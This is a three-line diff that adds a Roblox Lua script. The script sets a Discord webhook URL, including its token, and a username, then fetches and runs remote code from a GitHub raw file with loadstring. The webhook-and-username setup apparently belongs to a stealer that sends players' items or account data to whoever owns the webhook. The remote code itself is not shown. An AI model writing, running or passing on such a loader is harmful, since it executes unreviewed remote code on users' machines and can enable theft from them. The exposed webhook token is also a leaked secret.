@@ -1,0 +1,3 @@
+getgenv().Webhook = "[Webhook](https://discord.com/api/webhooks/1417129749364609055/AG8BQGdRA15sbGili3_R9215pL88Ye83yIDNhT219MeT5jydyM2GjRb6rF8wWfceTV60)" --<< Put their ur Webhook
+getgenv().Username = "flowb810" --<< Put thier ur username
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RblxScriptsOG/Main/refs/heads/main/main.lua"))() --Don't change this
